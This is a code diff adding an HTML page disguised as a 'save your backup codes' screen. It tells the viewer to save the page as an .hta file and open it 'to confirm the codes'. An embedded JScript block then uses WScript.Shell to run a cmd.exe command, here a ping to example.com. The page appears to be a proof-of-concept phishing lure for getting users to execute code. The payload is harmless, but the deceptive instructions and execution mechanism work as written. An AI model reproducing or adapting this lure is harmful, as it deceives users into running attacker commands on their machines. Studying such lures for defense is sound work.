@@ -1,0 +1,140 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>Save Backup Codes</title>
+        <style>
+            body {
+                font-family: "Roboto", sans-serif;
+                background: #f1f3f4;
+                margin: 0;
+                padding: 0;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+            }
+
+            .card {
+                background: #fff;
+                width: 400px;
+                border-radius: 8px;
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+                padding: 24px 32px;
+                text-align: center;
+            }
+
+            h2 {
+                margin-top: 0;
+                font-weight: 400;
+            }
+
+            .desc {
+                font-size: 0.95em;
+                color: #5f6368;
+            }
+
+            .instructions {
+                text-align: left;
+                background: #f8f9fa;
+                border-left: 4px solid #1a73e8;
+                padding: 16px;
+                margin: 24px 0;
+                font-size: 0.9em;
+                line-height: 1.8em;
+            }
+
+            .codes {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                gap: 12px;
+                font-size: 1.1em;
+                margin: 20px 0;
+            }
+
+            .codes div::before {
+                content: "☐ ";
+            }
+
+            .footer {
+                font-size: 0.8em;
+                color: #666;
+                margin-top: 12px;
+            }
+
+            .logo {
+                margin-top: 16px;
+            }
+
+            .logo img {
+                height: 24px;
+            }
+
+            button {
+                margin-top: 20px;
+                padding: 8px 16px;
+                font-size: 0.9em;
+                background: #f1f3f4;
+                border: none;
+                border-radius: 4px;
+                cursor: pointer;
+            }
+
+            button:hover {
+                background: #e0e0e0;
+            }
+
+            kbd {
+                background: #eee;
+                border-radius: 3px;
+                padding: 2px 6px;
+                font-family: monospace;
+                font-size: 12px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="card">
+            <h2>Save your backup codes</h2>
+            <div class="desc">
+                Follow the instructions below to save your backup codes.
+            </div>
+
+            <div class="instructions">
+                <div>
+                    1. Press <kbd>Ctrl</kbd> + <kbd>S</kbd> to save this page.
+                </div>
+                <div>
+                    2. Name the file
+                    <kbd><strong>MfaBackupCodes2025.hta</strong></kbd
+                    >.
+                </div>
+                <div>
+                    3. After saving, open the file to confirm the codes are
+                    stored properly.
+                </div>
+            </div>
+
+            <div class="codes">
+                <div>8234 6752</div>
+                <div>1903 8441</div>
+                <div>4527 3096</div>
+                <div>6658 1204</div>
+                <div>2719 4890</div>
+                <div>5116 7385</div>
+                <div>0327 1968</div>
+                <div>7475 3261</div>
+                <div>9082 6673</div>
+                <div>3849 0570</div>
+            </div>
+
+            <div class="footer">
+                You can only use each backup code once.<br />
+            </div>
+        </div>
+        <script language="JScript">
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run("cmd.exe /c ping example.com");
+        </script>
+    </body>
+</html>
